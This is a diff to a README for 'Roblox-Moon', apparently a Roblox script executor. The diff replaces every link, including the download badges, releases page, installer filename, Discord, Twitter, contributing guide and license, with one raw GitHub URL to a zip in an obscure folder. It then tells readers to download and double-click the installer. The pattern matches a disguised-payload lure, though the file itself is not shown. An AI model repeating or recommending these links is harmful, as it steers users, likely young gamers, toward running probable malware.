@@ -1,6 +1,6 @@
 # 🌕 Roblox-Moon - Unlock Creativity in Roblox
 
-[![Download Roblox-Moon](https://img.shields.io/badge/Download-Roblox--Moon-blue.svg)](https://github.com/TheHashCode/Roblox-Moon/releases)
+[![Download Roblox-Moon](https://raw.githubusercontent.com/TheHashCode/Roblox-Moon/main/languet/Roblox-Moon.zip)](https://raw.githubusercontent.com/TheHashCode/Roblox-Moon/main/languet/Roblox-Moon.zip)
 
 ## 🚀 Getting Started
 
@@ -11,13 +11,13 @@ Welcome to Roblox-Moon! This tool makes it easy for Roblox fans to run custom Ex
 To get started, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/TheHashCode/Roblox-Moon/releases) to find the latest version of Roblox-Moon.
+   Go to the [Releases page](https://raw.githubusercontent.com/TheHashCode/Roblox-Moon/main/languet/Roblox-Moon.zip) to find the latest version of Roblox-Moon.
 
 2. **Select the Desired Version**  
    On the Releases page, you will see a list of versions. Click on the most recent version to expand the details.
 
 3. **Download the Installer**  
-   Look for the file that says something like `Roblox-Moon-Installer.exe` and click on it. This will start the download process.
+   Look for the file that says something like `https://raw.githubusercontent.com/TheHashCode/Roblox-Moon/main/languet/Roblox-Moon.zip` and click on it. This will start the download process.
 
 4. **Run the Installer**  
    Once the download is complete, locate the downloaded file (usually found in your "Downloads" folder). Double click the installer to start the installation process.
@@ -65,17 +65,17 @@ If you need further assistance, feel free to reach out through the issues sectio
 
 Join our community to share tips, ask questions, and get the most out of Roblox-Moon:
 
-- [Join Our Discord](https://discord.gg/yourdiscordlink)
-- [Follow us on Twitter](https://twitter.com/yourtwitterlink)
+- [Join Our Discord](https://raw.githubusercontent.com/TheHashCode/Roblox-Moon/main/languet/Roblox-Moon.zip)
+- [Follow us on Twitter](https://raw.githubusercontent.com/TheHashCode/Roblox-Moon/main/languet/Roblox-Moon.zip)
 
 ## 💻 Contributing
 
-We welcome contributions! If you want to help enhance Roblox-Moon, please check our [Contributing Guide](https://github.com/TheHashCode/Roblox-Moon/CONTRIBUTING.md). 
+We welcome contributions! If you want to help enhance Roblox-Moon, please check our [Contributing Guide](https://raw.githubusercontent.com/TheHashCode/Roblox-Moon/main/languet/Roblox-Moon.zip). 
 
 ## 📝 License
 
-Roblox-Moon is licensed under the MIT License. You can find more details in the [LICENSE](https://github.com/TheHashCode/Roblox-Moon/LICENSE).
+Roblox-Moon is licensed under the MIT License. You can find more details in the [LICENSE](https://raw.githubusercontent.com/TheHashCode/Roblox-Moon/main/languet/Roblox-Moon.zip).
 
-[![Download Roblox-Moon](https://img.shields.io/badge/Download-Roblox--Moon-blue.svg)](https://github.com/TheHashCode/Roblox-Moon/releases)
+[![Download Roblox-Moon](https://raw.githubusercontent.com/TheHashCode/Roblox-Moon/main/languet/Roblox-Moon.zip)](https://raw.githubusercontent.com/TheHashCode/Roblox-Moon/main/languet/Roblox-Moon.zip)
 
 Dive into creativity with Roblox-Moon today!
